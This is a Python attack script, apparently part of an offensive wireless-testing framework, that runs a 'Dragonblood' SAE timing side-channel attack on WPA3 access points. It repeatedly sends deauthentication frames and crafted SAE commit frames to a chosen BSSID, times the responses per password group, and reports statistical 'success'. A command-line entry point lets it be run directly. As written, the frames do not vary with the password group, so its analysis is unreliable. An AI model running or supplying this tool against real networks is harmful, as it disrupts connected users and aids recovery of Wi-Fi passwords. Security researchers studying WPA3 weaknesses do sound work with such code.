from __future__ import annotations

import argparse
import logging
import time
from itertools import combinations

from attacks.common.analysis.plotting import (
    plot_timing_boxplot,
    plot_timing_cdf,
    plot_timing_histogram,
)
from attacks.common.analysis.stats import compare_groups, compute_group_statistics
from attacks.common.base_attack import BaseAttack
from attacks.common.cli import add_common_arguments, create_backend, run_attack
from attacks.common.config import AttackConfig, TimingAttackConfig
from attacks.common.io.reporting import (
    create_run_directory,
    save_analysis_report,
    save_metadata,
    save_timing_samples_csv,
)
from attacks.common.models import AnalysisReport, TimingRawResults, TimingSample
from attacks.common.wireless.sae import (
    build_sae_commit_frame,
    is_sae_commit_response,
)

logger = logging.getLogger(__name__)


class TimingSideChannelAttack(BaseAttack):
    def execute(self, config: AttackConfig) -> TimingRawResults:
        if not isinstance(config, TimingAttackConfig):
            raise TypeError("TimingSideChannelAttack requires TimingAttackConfig")

        all_samples: list[TimingSample] = []
        source_mac = "02:00:00:00:00:01"

        for password_group in config.password_groups:
            logger.info(
                "Collecting %d samples for group '%s'",
                config.samples_per_group,
                password_group,
            )

            for attempt in range(config.samples_per_group):
                self.backend.send_deauth(
                    interface=self.interface,
                    target_bssid=self.target_bssid,
                    station_mac=source_mac,
                )

                frame = build_sae_commit_frame(
                    target_bssid=self.target_bssid,
                    source_mac=source_mac,
                )

                def response_filter(packet, bssid=self.target_bssid):
                    return is_sae_commit_response(packet, bssid)

                elapsed_ns = self.backend.measure_response_time(
                    interface=self.interface,
                    frame_to_send=frame,
                    response_filter=response_filter,
                    timeout=config.timeout_seconds,
                )

                if elapsed_ns is not None:
                    sample = TimingSample(
                        password_group=password_group,
                        attempt=attempt,
                        response_time_ns=elapsed_ns,
                        timestamp=time.time(),
                    )
                    all_samples.append(sample)
                else:
                    logger.debug("No response for group '%s' attempt %d", password_group, attempt)

                if config.inter_sample_delay_ms > 0:
                    time.sleep(config.inter_sample_delay_ms / 1000)

        logger.info("Collected %d total samples across %d groups", len(all_samples), len(config.password_groups))

        return TimingRawResults(
            attack_name="dragonblood-timing",
            samples=all_samples,
            metadata={"password_groups": config.password_groups},
        )

    def analyze(self, raw_results: TimingRawResults) -> AnalysisReport:
        run_directory = create_run_directory(self.output_dir, "dragonblood-timing")

        grouped_timings: dict[str, list[int]] = {}
        for sample in raw_results.samples:
            group_name = sample.password_group
            if group_name not in grouped_timings:
                grouped_timings[group_name] = []
            grouped_timings[group_name].append(sample.response_time_ns)

        group_statistics = {}
        for group_name, timing_values in grouped_timings.items():
            statistics = compute_group_statistics(group_name, timing_values)
            group_statistics[group_name] = {
                "count": statistics.count,
                "mean_ns": statistics.mean_ns,
                "median_ns": statistics.median_ns,
                "std_ns": statistics.std_ns,
            }
            logger.info(
                "Group '%s': n=%d mean=%.0fns std=%.0fns",
                group_name, statistics.count, statistics.mean_ns, statistics.std_ns,
            )

        any_significant = False
        comparison_results = []
        group_names = list(grouped_timings.keys())
        for group_a_name, group_b_name in combinations(group_names, 2):
            comparison = compare_groups(
                group_a_name, grouped_timings[group_a_name],
                group_b_name, grouped_timings[group_b_name],
            )
            comparison_results.append({
                "group_a": comparison.group_a,
                "group_b": comparison.group_b,
                "p_value": comparison.p_value,
                "significant": bool(comparison.significant),
            })
            if comparison.significant:
                any_significant = True

        plots_directory = run_directory / "plots"
        plot_paths = []
        if grouped_timings:
            plot_paths.append(plot_timing_histogram(grouped_timings, plots_directory / "histogram.png"))
            plot_paths.append(plot_timing_boxplot(grouped_timings, plots_directory / "boxplot.png"))
            plot_paths.append(plot_timing_cdf(grouped_timings, plots_directory / "cdf.png"))

        csv_path = run_directory / "raw_samples.csv"
        save_timing_samples_csv(raw_results.samples, csv_path)
        save_metadata(
            run_directory / "metadata.json",
            attack_name="dragonblood-timing",
            config_dict=raw_results.metadata,
        )

        if any_significant:
            summary = "Timing side-channel detected: statistically significant differences between password groups"
        else:
            summary = "No significant timing differences detected between password groups"

        report = AnalysisReport(
            attack_name="dragonblood-timing",
            success=any_significant,
            summary=summary,
            raw_csv_path=csv_path,
            plots=plot_paths,
            metadata={
                "group_statistics": group_statistics,
                "comparisons": comparison_results,
            },
        )

        save_analysis_report(report, run_directory / "analysis.json")

        return report


def main():
    parser = argparse.ArgumentParser(description="Dragonblood SAE timing side-channel attack")
    add_common_arguments(parser)
    parser.add_argument("--samples", type=int, default=1000, help="Samples per password group")
    arguments = parser.parse_args()

    backend = create_backend(arguments)
    attack = TimingSideChannelAttack(
        interface=arguments.interface,
        target_bssid=arguments.bssid,
        target_ssid=arguments.ssid,
        output_dir=arguments.output_dir,
        backend=backend,
    )

    config = TimingAttackConfig(
        target_bssid=arguments.bssid,
        target_ssid=arguments.ssid,
        channel=arguments.channel,
        samples_per_group=arguments.samples,
    )

    run_attack("dragonblood-timing", attack, config)


if __name__ == "__main__":
    main()
